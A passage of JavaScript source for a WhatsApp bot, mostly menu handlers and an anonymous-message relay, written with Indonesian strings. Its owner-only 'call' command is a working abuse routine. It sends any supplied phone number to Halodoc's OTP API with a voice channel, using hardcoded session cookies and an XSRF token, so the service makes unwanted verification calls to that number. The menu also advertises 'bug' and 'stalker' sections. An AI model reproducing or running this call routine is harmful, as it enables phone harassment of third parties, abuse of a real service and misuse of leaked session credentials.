‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ ▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁
┏━❲❲ɪɴꜰᴏ ʙᴏᴛ❳❳━━━━━━━━━┓
┃ ꜱᴛᴀᴛᴜꜱ : _${isPrem ? '✅' : `❌`}_
┃ ᴍᴏᴅᴇ : _${XeonBotInc.public ? 'Public' : `Self`}_
┃ prefix : _ᴀʟʟ ᴘʀᴇꜰɪx_
┃ ᴘʟᴀᴛꜰᴏʀᴍ : _ʀᴇᴅᴍɪ 9ᴄ_
┗━━━━━━━━━━━━━━━━━━┛

┏━❲❲ɪɴꜰᴏ ʜᴀʀɪ ɪɴɪ❳❳━━━━━━━━━┓
┃ ᴡᴀᴋᴛᴜ
┃ _${xtime}_
┃ ᴛᴀɴɢɢᴀʟ
┃ _${xdate}_
┃ ᴜᴄᴀᴘᴀɴ
┃ _${xeonytimewisher}_
┗━━━━━━━━━━━━━━━━━━┛

┏┃simplemenu┃┓
┃╭─────────────────┓
┃│々 *.ᴀʟʟᴍᴇɴᴜ*
┃│々 *.ɢᴀᴍᴇᴍᴇɴᴜ*
┃│々 *.ɪꜱʟᴀᴍɪᴍᴇɴᴜ*
┃│々 *.ᴅᴏᴍᴀɪɴᴍᴇɴᴜ*
┃│々 *.ᴘᴜꜱʜᴍᴇɴᴜ*
┃│々 *.ᴄᴘᴀɴᴇʟᴍᴇɴᴜ*
┃│々 *.ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ*
┃│々 *.ꜰᴜɴᴍᴇɴᴜ*
┃│々 *.ᴀɪᴍᴇɴᴜ*
┃│々 *.ɢʀᴏᴜᴘᴍᴇɴᴜ*
┃│々 *.ᴏᴡɴᴇʀᴍᴇɴᴜ*
┃│々 *.ᴘʜᴏᴛᴏᴏxʏᴍᴇɴᴜ*
┃│々 *.ᴛᴇxᴛᴘʀᴏᴍᴇɴᴜ*
┃│々 *.ᴇᴘʜᴏᴛᴏ360ᴍᴇɴᴜ*
┃│々 *.ᴀɴɪᴍᴇᴍᴇɴᴜ*
┃│々 *.ɴꜱꜰᴡᴍᴇɴᴜ*
┃│々 *.ʀᴀɴᴅᴏᴍᴘʜᴏᴛᴏᴍᴇɴᴜ*
┃│々 *.ʀᴀɴᴅᴏᴍᴠɪᴅᴇᴏᴍᴇɴᴜ*
┃│々 *.ꜱᴛɪᴄᴋᴇʀᴍᴇɴᴜ*
┃│々 *.ᴅᴀᴛᴀʙᴀꜱᴇᴍᴇɴᴜ*
┃│々 *.ꜱᴛᴀʟᴋᴇʀᴍᴇɴᴜ*
┃│々 *.ʙᴜɢᴍᴇɴᴜ*
┃│々 *.ᴏᴛʜᴇʀᴍᴇɴᴜ*
┃│々 *.ʀᴘɢᴍᴇɴᴜ*
┃│々 *.ꜱᴛᴏʀᴇᴍᴇɴᴜ*
┃│々 *.ᴀɴᴏɴʏᴍᴏᴜꜱᴍᴇɴᴜ*
┃│々 *.Qᴜᴏᴛᴇꜱᴍᴇɴᴜ*
┗╰─────────────────┛
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

• _*ᴊɪᴋᴀ ᴀᴅᴀ ғɪᴛᴜʀ ʏᴀɴɢ ᴇʀʀᴏʀ, sɪʟᴀʜᴋᴀɴ ᴋᴇᴛɪᴋ #𝚛𝚎𝚙𝚘𝚛𝚝*_
• _*ɪғ ᴛʜᴇʀᴇ ɪs ᴀɴ ᴇʀʀᴏʀ ғᴇᴀᴛᴜʀᴇs, ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ #𝚛𝚎𝚙𝚘𝚛𝚝*_`
            let ments = [ownernya, me, mark]        
    sendXeonBotIncMessage(from, { 
text: `${xeonezy}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
//"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
           }
           break
//=========================================\\

//=========================================\\
case 'allmenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${allmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break

case "domainmenu": {
if (!XeonTheCreator) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `6285892928715@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *DOMAIN MENU* )▭▬▭

⭔ ${prefix}subdomain 
⭔ ${prefix}addgc
⭔ ${prefix}delgc

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
XeonBotInc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/596b9a4aae7949d1f02df.jpg',
sourceUrl: "https://chat.whatsapp.com/JVTqE4Ra4r8BYjLagn2F7Q",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break

case 'gamemenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${gamemenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break

case 'cpanelmenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${cpanelmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
//=========================================\\
case 'storemenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${storemenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
//=========================================\\
case 'quotesmenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${quotesmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
//=========================================\\
case 'anonymousmenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${anonymousmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
//=========================================\\
case 'islamimenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${islamimenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/islam.jpeg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break

case 'rpgmenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${rpgmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/rpg.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break

case 'ownermenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${ownermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'pushmenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${pushmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'othermenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${othermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'downloadmenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Download Menu')
const dzsyagf = await fs.readFileSync(`./media/thumb1.mp4`)
let text = `Hallo @${sender.split("@")[0]}\n\n${downloadmenu(prefix, hituet)}`
XeonBotInc.sendMessage(m.chat,{ caption: text, video: dzsyagf, gifPlayback:true },{quoted:m})
}
break

case "confess": case 'menfes': case 'menfess':{
this.menfes = this.menfes ? this.menfes : {}
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return reply("Kamu masih berada dalam sesi menfess")
if (m.isGroup) return reply('Fitur Khusus Di private chat!')
if (!text) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if (!text.includes('|')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
this.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await XeonBotInc.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break
case 'balasmenfess': case 'balasmenfes': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return reply("Belum ada sesi menfess")
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find.b = m.sender
find.state = 'CHATTING'
this.menfes[find.id] = {...find}
await XeonBotInc.sendMessage(other, {text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`, mentions: [m.sender]})
XeonBotInc.sendMessage(m.chat, {text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`})
}
break
 case 'tolakmenfess': case 'tolakmenfes': {
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return reply("Belum ada sesi menfess")
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
XeonBotInc.sendMessage(other, {text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender]})
// await XeonBotInc.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
reply("Menfess berhasil di tolak 🤚")
delete this.menfes[roof.id]
}
break
 case "stopconfess": case 'stopmenfess': {
 //find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return reply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
XeonBotInc.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
await reply("ok")
delete this.menfes[find.id]
}
 break

case 'groupmenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Group Menu')
const dzsyagf = await fs.readFileSync(`./media/thumb4.mp4`)
let text = `Hallo @${sender.split("@")[0]}\n\n${groupmenu(prefix, hituet)}`
XeonBotInc.sendMessage(m.chat,{ caption: text, video: dzsyagf, gifPlayback:true },{quoted:m})
}
break


case 'call':
if (!XeonTheCreator) return XeonStickOwner()
if (!args[0]) return replygcxeon(`Penggunaan ${command} nomor\nContoh ${command} +${6281316643491}`)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+${6281316643491}`)) return replygcxeon('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {replygcxeon(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {replygcxeon(`${JSON.stringify(error, null, 2)}`)})
break

case 'funmenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Fun Menu')
const dzsyagf = await fs.readFileSync(`./media/thumb5.mp4`)
let text = `Hallo @${sender.split("@")[0]}\n\n${funmenu(prefix, hituet)}`
XeonBotInc.sendMessage(m.chat,{ caption: text, video: dzsyagf, gifPlayback:true },{quoted:m})
}
break
case 'stalkermenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Stalker Menu')
const dzsyagf = await fs.readFileSync(`./media/thumb2.mp4`)
let text = `Hallo @${sender.split("@")[0]}\n\n${stalkermenu(prefix, hituet)}`
XeonBotInc.sendMessage(m.chat,{ caption: text, video: dzsyagf, gifPlayback:true },{quoted:m})
}
break
case 'randomphotomenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Pic Menu')
const dzsyagf = await fs.readFileSync(`./media/thumb1.mp4`)
let text = `Hallo @${sender.split("@")[0]}\n\n${randomphotomenu(prefix, hituet)}`
XeonBotInc.sendMessage(m.chat,{ caption: text, video: dzsyagf, gifPlayback:true },{quoted:m})
}
break
case 'randomvideomenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${randvideomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'textpromenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Textpro Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${textpromenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'photooxymenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Photooxy Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${photooxymenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'ephoto360menu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Photo360 Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${ephoto360menu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'nsfwmenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Anime NSFW Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${nsfwmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'animemenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Anime Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${animemenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'stickermenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Sticker Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${stickermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'databasemenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Database Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${databasemenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'aimenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'OpenAI Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${aimenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'bugmenu': {
  reply(mess.wait)
var unicorn = await getBuffer(picak+'Bug Menu')
sendXeonBotIncMessage(from, { 
text: `Hallo @${sender.split("@")[0]}\n\n${bugmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
